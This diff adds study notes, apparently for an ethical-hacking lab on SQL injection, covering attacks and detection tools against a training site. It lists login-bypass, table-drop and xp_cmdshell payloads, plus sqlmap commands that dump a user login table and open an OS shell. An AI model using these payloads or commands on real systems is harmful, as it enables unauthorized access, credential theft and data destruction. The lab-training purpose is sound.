@@ -1,0 +1,35 @@
+15-SQL Injection
+SQL injection can be used to implement the following attacks:
+Authentication bypass, Authorization bypass,Information disclosure,Compromised data integrity,Compromised availability of data,Remote code execution
+
+    Perform SQL injection attacks
+
+        Perform an SQL injection attack on an MSSQL database
+        	In login
+        	blah' or 1=1 -- 
+        	blah';insert into login values ('john','apple123'); --
+        	blah';create database mydatabase; --
+        	blah'; DROP TABLE table_name; --
+        	RCE
+			blah';exec master..xp_cmdshell 'ping www.certifiedhacker.com -l 65000 -t'; --
+        Perform an SQL injection attack against MSSQL to extract databases using sqlmap
+        	sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value that you copied in Step 8]" --dbs
+        	In this query, -u specifies the target URL (the one you noted down in Step 6), --cookie specifies the HTTP cookie header value, and --dbs enumerates DBMS databases.
+        	sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step 8]" -D moviescope --tables 
+        	sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step 8]" -D moviescope -T User_Login --dump
+
+        	sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step 8]" --os-shell
+
+        	You can also use other SQL injection tools such as Mole (https://sourceforge.net), Blisqy (https://github.com), blind-sql-bitshifting (https://github.com), bsql (https://github.com), and NoSQLMap (https://github.com) to perform SQL injection attacks.
+
+    Detect SQL injection vulnerabilities using various SQL injection detection tools
+
+        Detect SQL injection vulnerabilities using DSSS
+        	Damn Small SQLi Scanner (DSSS) 
+        	python3 dsss.py -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step 12]" 
+        	Te da el link vulnerable
+
+        Detect SQL injection vulnerabilities using OWASP ZAP
+        	Using automatic testing
+
+        	You can also use other SQL injection detection tools such as Acunetix Web Vulnerability Scanner (https://www.acunetix.com), Snort (https://snort.org), Burp Suite (https://www.portswigger.net), w3af (http://w3af.org), and Netsparker Web Application Security Scanner 
